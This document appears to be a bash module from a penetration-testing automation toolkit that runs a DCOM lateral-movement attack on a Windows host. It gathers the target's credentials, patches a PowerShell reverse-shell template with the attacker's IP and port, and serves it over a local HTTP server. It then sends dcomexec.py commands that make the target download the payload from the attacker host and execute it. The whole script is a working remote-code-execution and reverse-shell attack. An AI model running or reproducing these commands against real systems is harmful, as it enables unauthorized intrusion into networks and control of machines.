#!/bin/bash

: '
perform executeDcom attack
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "1337")
HTTP_PORT_FIELD=$(form_item  "http port" "number" "http_port" "1234")
DOMAIN_FIELD=$(form_item  "domain" "domain")
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")

# Generate GUI form
generate_form "${HTTP_PORT_FIELD}" "${LPORT_FIELD}" "${DOMAIN_FIELD}" "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

HTTP_PORT=${form_data["http_port"]}
LPORT=${form_data["lport"]}
DOMAIN=${form_data["domain"]}
IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}

FILES_FOLDER="${SCRIPTS_DIR}/reconnaissance/windows/bloodhound/executeDCOM/.files"

# Define replacement fields
REPLACE_FIELDS=(
    "[LHOST]" "${KALI_IP}"
    "[LPORT]" "${LPORT}"
)

filename="shell.ps1"
find_and_replace_file "${FILES_FOLDER}" "${filename}" "${REPLACE_FIELDS[@]}"

start_python_server "${FILES_FOLDER}" "${HTTP_PORT}"

paste_command "dcomexec.py -object MMC20 -silentcommand -debug ${DOMAIN}/${USERNAME}:'${PASSWORD}'@${IP} 'powershell.exe Invoke-WebRequest -Uri http://${KALI_IP}:${HTTP_PORT}/$(basename "${TMP_FILE}") -OutFile C:\Windows\TEMP\shell.ps1'"
xdotool key Return
sleep 5

paste_command "dcomexec.py -object MMC20 -silentcommand -debug ${DOMAIN}/${USERNAME}:'${PASSWORD}'@${IP} 'powershell.exe C:\Windows\TEMP\shell.ps1'"
xdotool key Return
